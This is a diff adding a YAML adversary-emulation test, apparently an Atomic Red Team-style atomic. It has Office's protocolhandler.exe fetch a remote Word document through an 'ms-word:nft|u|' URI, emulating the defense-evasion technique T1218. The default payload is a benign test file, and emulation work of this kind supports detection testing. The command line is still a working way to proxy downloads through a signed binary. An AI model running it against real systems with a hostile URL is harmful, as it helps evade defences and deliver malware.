@@ -1,0 +1,35 @@
+api_version: "2.0"
+name: ProtocolHandler.exe Downloaded a Suspicious File
+description: |
+    Emulates attack via documents through protocol handler in Microsoft Office.  On successful execution you should see Microsoft Word launch a blank file.
+args:
+    - name: remote_url
+      type: string
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx
+uuid: db020456-125b-4c8b-a4a7-487df8afb5a2
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1218: System Binary Proxy Execution'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        Microsoft Word must be installed
+      inline: |
+        try {
+          $wdApp = New-Object -COMObject "Word.Application"
+          Stop-Process -Name "winword"
+          exit 0 } catch { {Write-Host "You will need to install Microsoft Word manually to meet this requirement"
+        } }
+      executor: powershell
+    - name: protocolhandler.exe-downloaded-a-suspicious-file
+      inline: |
+        FOR /F "tokens=2*" %a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Winword.exe" /V PATH') do set microsoft_wordpath=%b
+        call "%microsoft_wordpath%\protocolhandler.exe" "ms-word:nft|u|{{.Args.remote_url}}"
+      executor: command_prompt
+      cleanup:
+        inline: ""
+        executor: command_prompt
